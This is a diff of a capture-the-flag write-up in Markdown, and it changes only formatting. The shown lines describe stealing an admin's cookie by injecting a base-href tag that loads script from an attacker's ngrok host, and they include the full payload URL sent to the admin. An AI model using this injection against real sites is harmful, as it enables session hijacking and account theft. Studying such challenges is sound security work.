@@ -40,7 +40,7 @@ So this is the setup for the server
 
 ![image](https://user-images.githubusercontent.com/58823465/167920326-329be168-ac77-4f9f-aca2-84f29e83bb7a.png)
 
-**note: Make sure to start your ngrok server in the same directory for the /assets/js/bootstrap.js **
+**note: Make sure to start your ngrok server in the same directory for the /assets/js/bootstrap.js**
 
 so using the payload :
 
@@ -59,7 +59,7 @@ Now all we have to do is add a document.cookie attribut and steal it with out cu
 
 and then we send this url to the admin to steal his cookie !
 
-<http://challenge_link/index.php?src='><base href="http://7923-41-225-41-253.ngrok.io">>
+```http://challenge_link/index.php?src='><base href="http://7923-41-225-41-253.ngrok.io">```
 
 ![image](https://user-images.githubusercontent.com/58823465/167921246-78c3a39f-7b38-456c-9890-a611819ca7de.png)
 
